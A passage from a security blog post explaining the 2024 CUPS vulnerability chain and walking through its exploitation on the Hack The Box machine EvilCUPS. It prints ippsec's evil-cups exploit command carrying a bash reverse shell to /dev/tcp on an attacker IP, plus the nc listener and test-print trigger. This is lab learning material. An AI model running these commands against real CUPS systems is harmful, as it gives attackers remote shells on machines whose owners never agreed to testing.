<li>Persistent vulnerability due to:
<ul>
<li>Integration of <code>foomatic-filters</code> into CUPS without including a previous fix</li>
<li>Backward compatibility requirements for older UNIX-based printers</li>
</ul>
</li>
</ul>
<h4 id="step-5-attack-execution">Step 5: Attack Execution:</h4>
<p>Once the fake printer is added and the malicious PPD file is in place:</p>
<ol>
<li>Wait for a print job to be sent to the fake printer, or</li>
<li>Trigger a test print from the CUPS web interface (if accessible)</li>
<li>The malicious commands injected via the PPD file will be executed when the print job is processed</li>
</ol>
<!-- raw HTML omitted -->
<p>This attack chain demonstrates the compounding effect of multiple vulnerabilities in a system. Always ensure proper permissions and ethical considerations before testing or demonstrating such exploits.</p>
<!-- raw HTML omitted -->
<h2 id="example-of-exploitation-dot">Example of Exploitation.</h2>
<ul>
<li>This example is taken from the HTB box EvilCUPS:
<ul>
<li><a href="https://app.hackthebox.com/machines/EvilCUPS">https://app.hackthebox.com/machines/EvilCUPS</a></li>
</ul>
</li>
<li>You can see my full writeup here:
<ul>
<li><a href="https://bloodstiller.com/walkthroughs/evilcups-box/">https://bloodstiller.com/walkthroughs/evilcups-box/</a></li>
</ul>
</li>
</ul>
<h3 id="preparing-the-cups-exploit">Preparing the CUPS Exploit:</h3>
<ul>
<li>
<p><strong>I will be using ippsec&rsquo;s cups exploit for this attack</strong>:</p>
<ul>
<li><a href="https://github.com/ippsec/evil-cups">https://github.com/ippsec/evil-cups</a></li>
</ul>
</li>
<li>
<p><strong>Preparing Exploit</strong>:</p>
<ul>
<li><code>git clone https://github.com/IppSec/evil-cups.git</code></li>
<li><code>cd evil-cups</code></li>
</ul>
</li>
<li>
<p><strong>Prepare Python Venv</strong>:</p>
<ul>
<li><code>python3 -m venv evilCups</code></li>
<li><code>source evilCups/bin/activate</code></li>
<li>+Note+: I use venv&rsquo;s as it allows me to install different deps without causing conflicts with my base python installation.</li>
</ul>
</li>
<li>
<p><strong>Install Requirements</strong>:</p>
<ul>
<li><code>pip3 install -r requirements.txt</code></li>
</ul>
</li>
</ul>
<h3 id="running-the-cups-exploit">Running the CUPS Exploit:</h3>
<ol>
<li>
<p><strong>Running the exploit to send the payload</strong>:</p>
<ul>
<li><code>python3 evilcups.py [AttackIP] [VictimIP] &quot;bash -c 'bash -i &gt;&amp; /dev/tcp/[AttackIP]/[AttackPort] 0&gt;&amp;1'&quot;</code></li>
<li><code>python3 evilcups.py 10.10.14.58 $box &quot;bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.58/443 0&gt;&amp;1'&quot;</code></li>
<li><figure><img src="/ox-hugo/2024-10-22-095213_.png">
</figure>
</li>
<li>Now the payload is sent we can move onto the next stage of triggering the exploit:</li>
</ul>
</li>
<li>
<p><strong>Start our listener</strong>:</p>
<ul>
<li><code>rlwrap -cAr nc -lnvp 443</code></li>
</ul>
</li>
<li>
<p><strong>Trigger the exploit</strong>:</p>
<ul>
<li>
<p>Navigating the CUPS web-console we can see our malicious printer is listed:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-22-090825_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>Printing our test page to trigger the exploit</strong>:</p>
<ul>
<li>In order to activate the exploit and trigger the malicious PPD directives we need to either wait for a print job to be sent to the fake printer or we can trigger one ourselves using the &ldquo;<code>Test Print</code>&rdquo; functionality.</li>
<li><figure><img src="/ox-hugo/2024-10-22-090909_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Low Priv Shell Caught</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-22-095152_.png">
</figure>
</li>
<li><figure><img src="/ox-hugo/2024-10-22-095738_.png">
</figure>
</li>
</ul>
</li>
</ol>
<h2 id="conclusion">Conclusion</h2>
<p>The vulnerabilities in CUPS demonstrate the ongoing need for vigilance in system security, even in widely-used and well-established software.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47176">CVE-2024-47176</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47175">CVE-2024-47175</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47177">CVE-2024-47177</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47076">CVE-2024-47076</a></li>
<li><a href="https://github.com/ippsec/evil-cups">Evil CUPS Exploit Repository</a></li>
</ul>

            
        </div>
    </article>

        </main>

        <footer class="footer">
    <div class="footer-left">
        <ul class="social">
            
                <li>All Rights Reserved ®.</li>
            

            
                <li>Bloodstiller</li>
            

            
                
            
                
            
                
                    <li>
                        
                            <a href="https://github.com/bloodstiller" target="_blank">
                                <i class="bi-github"></i>
                            </a>
                        

                    </li>
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
        </ul>
    </div>

    <div class="footer-right">
        <ul class="control status clearfix">
            
                <li>
                    
                        Word Count:
                        1612
                    
                </li>
            


            
                <li>en</li>
            

            

            

            
                <li>
                    
                        Last modified: &nbsp;
                        <time>
                            Oct 22 2024 00:00:00
                        </time>
                    
                </li>
            

            
        </ul>
    </div>
</footer>

    </body>

    






















    
        
        <script
            type="text/javascript"
            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/custom.e55ae031ca7d8c1e9bde9a72058dd382e3de5ff9b7df41d6d0e4ccb82ff9962e74b4865412dc15db16e5f16012d5cf9e2330b9826a3a36d5a272077f70e1341b.js"
            integrity="sha512-5VrgMcp9jB6b3ppyBY3TguPeX/m330HW0OTMuC/5li50tIZUEtwV2xbl8WAS1c&#43;eIzC5gmo6NtWicgd/cOE0Gw=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
    















<link
    rel="stylesheet"
    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />




</html>
